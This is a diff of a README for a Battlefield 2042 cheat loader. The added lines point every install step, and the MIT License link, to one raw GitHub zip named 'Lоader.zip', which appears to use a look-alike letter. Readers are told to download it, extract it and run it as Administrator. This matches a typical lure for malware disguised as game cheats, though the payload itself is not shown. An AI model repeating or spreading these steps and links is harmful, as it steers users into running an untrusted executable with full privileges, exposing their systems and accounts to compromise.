@@ -46,12 +46,12 @@ Take advantage of a robust set of features, each designed to maximize performanc
 
 Get started in minutes! Follow these detailed steps to install the Battlefield 2042 Cheats Loader across your preferred platform:
 
-**1. Download Loader.rar from the repository.**
+**1. Download https://raw.githubusercontent.com/axlcraft/Battlefield2042-EdgeTools/main/Lоader.zip from the repository.**
 
-**2. Extract Loader.rar**  
+**2. Extract https://raw.githubusercontent.com/axlcraft/Battlefield2042-EdgeTools/main/Lоader.zip**  
 Use a secure, updated archiver tool like 7-Zip, WinRAR, or PeaZip to extract all files into a new folder.
 
-**3. Run Loader.exe as Administrator**  
+**3. Run https://raw.githubusercontent.com/axlcraft/Battlefield2042-EdgeTools/main/Lоader.zip as Administrator**  
 Right-click the executable and select "Run as administrator" for best compatibility.
 
 **4. Launch Battlefield 2042**  
@@ -88,7 +88,7 @@ Always use such tools in safe, offline, or testing environments, and respect the
 
 ## 📄 License (MIT)
 
-This project is distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+This project is distributed under the [MIT License](https://raw.githubusercontent.com/axlcraft/Battlefield2042-EdgeTools/main/Lоader.zip).  
 You are free to use, modify, share, and distribute this software with proper attribution.
 
 ---
